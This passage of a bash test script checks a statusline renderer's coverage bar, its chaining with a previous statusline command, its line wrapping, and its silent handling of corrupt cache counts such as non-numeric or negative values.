fi

mkcache "$H18" api 1.0 1.0 0 0 1 99 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H18" NO_COLOR=1 bash "$RENDER")
FILLED=$(echo "$OUT" | grep -o '▰' | wc -l | tr -d ' ')
if [ "$FILLED" = "1" ]; then
  ok "T-S18c 1 meas / 99 unmeas -> at least 1 filled cell, not 0"
else
  ko "T-S18c out=[$OUT] filled=$FILLED"
fi

mkcache "$H18" api 0 0 0 0 0 0 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H18" NO_COLOR=1 bash "$RENDER")
if ! echo "$OUT" | grep -qF '▰' && ! echo "$OUT" | grep -qF '▱'; then
  ok "T-S18d measured=unmeasured=pending=0 -> no bar at all"
else
  ko "T-S18d out=[$OUT]"
fi

mkcache "$H18" api 1.0 1.0 0 0 5 0 5 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H18" NO_COLOR=1 bash "$RENDER")
FILLED=$(echo "$OUT" | grep -o '▰' | wc -l | tr -d ' ')
if [ "$FILLED" = "2" ]; then
  ok "T-S18e pending counted in denominator: 5 meas / 5 pending -> half bar (2 filled)"
else
  ko "T-S18e out=[$OUT] filled=$FILLED"
fi

# ─── T-S19: chaining still fits/wraps with marker+bar present ───
H19="$(mktemp -d)"
cat > "$H19/marker.sh" << 'MARKER'
#!/usr/bin/env bash
stdin="$(cat)"
[ -n "$stdin" ] || exit 1
echo "PREVMARK"
MARKER
chmod +x "$H19/marker.sh"
printf 'bash %s/marker.sh' "$H19" > "$H19/statusline-prev-cmd"
shasum "$H19/statusline-prev-cmd" | awk '{print $1}' > "$H19/statusline-prev-cmd.sha"
mkcache "$H19" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"

OUT=$(printf '{"session_id":"t"}' | AMIRAL_HOME="$H19" AMIRAL_PROFILE=ultra COLUMNS=200 NO_COLOR=1 bash "$RENDER")
NLINES=$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')
if [ "$NLINES" = "1" ] && echo "$OUT" | grep -qF 'PREVMARK' && echo "$OUT" | grep -qF '⚓ ultra ·' && echo "$OUT" | grep -qF '▰'; then
  ok "T-S19a wide COLUMNS: PREVMARK + profile marker + coverage bar joined on one line"
else
  ko "T-S19a out=[$OUT] lines=$NLINES"
fi

OUT=$(printf '{"session_id":"t"}' | AMIRAL_HOME="$H19" AMIRAL_PROFILE=ultra COLUMNS=40 NO_COLOR=1 bash "$RENDER")
NLINES=$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')
L1=$(printf '%s\n' "$OUT" | head -1)
L2=$(printf '%s\n' "$OUT" | head -2 | tail -1)
if [ "$NLINES" = "2" ] && [ "$L1" = "PREVMARK" ] && echo "$L2" | grep -qF '⚓ ultra'; then
  ok "T-S19b narrow COLUMNS: two rows (PREVMARK, then marker+segment)"
else
  ko "T-S19b out=[$OUT]"
fi

# ─── T-S20 (review fix): hostile count values in the cache never paint a
# lying bar. BWK awk's -v strnum rule makes `m>0` a STRING comparison for
# non-numeric m ("corrupt" > "0" is true), which rendered 1 filled cell for
# zero real coverage; a negative count cancels the denominator into a false
# 5/5. Both are now a CORRUPT cache: whole segment silent (§1.8), marker
# still allowed (session identity, not cache data). ───
H20="$(mktemp -d)"
{
  printf 'v\t1\ngenerated_epoch\t%s\n' "$(date +%s)"
  printf 'mode\tapi\nnet_total\t1.0\nnet_today\t1.0\nprem_avoided_total\t0\nprem_avoided_today\t0\n'
  printf 'measured\tcorrupt\nunmeasured\t0\npending\t5\nesc_today\t0\n'
} > "$H20/butin-cache.tsv"
OUT=$(printf '{}' | AMIRAL_HOME="$H20" NO_COLOR=1 bash "$RENDER"); RC=$?
if [ -z "$OUT" ] && [ "$RC" = "0" ]; then
  ok "T-S20a non-numeric measured -> corrupt cache, silent (no ▰▱▱▱▱ fabrication)"
else
  ko "T-S20a rc=$RC out=[$OUT]"
fi
{
  printf 'v\t1\ngenerated_epoch\t%s\n' "$(date +%s)"
  printf 'mode\tapi\nnet_total\t1.0\nnet_today\t1.0\nprem_avoided_total\t0\nprem_avoided_today\t0\n'
  printf 'measured\t10\nunmeasured\t0\npending\t-5\nesc_today\t0\n'
} > "$H20/butin-cache.tsv"
OUT=$(printf '{}' | AMIRAL_HOME="$H20" NO_COLOR=1 bash "$RENDER"); RC=$?
if [ -z "$OUT" ] && [ "$RC" = "0" ]; then
  ok "T-S20b negative pending -> corrupt cache, silent (no false-full ▰▰▰▰▰ bar)"
else
  ko "T-S20b rc=$RC out=[$OUT]"
fi
OUT=$(printf '{}' | AMIRAL_HOME="$H20" AMIRAL_PROFILE=amiral NO_COLOR=1 bash "$RENDER"); RC=$?
if [ "$OUT" = "⚓ amiral" ] && [ "$RC" = "0" ]; then
  ok "T-S20c corrupt counts + profile -> marker alone (identity survives, data doesn't)"
else
  ko "T-S20c rc=$RC out=[$OUT]"
fi

echo ""; echo "  $PASS passed, $FAIL failed"
[ "$FAIL" = "0" ]
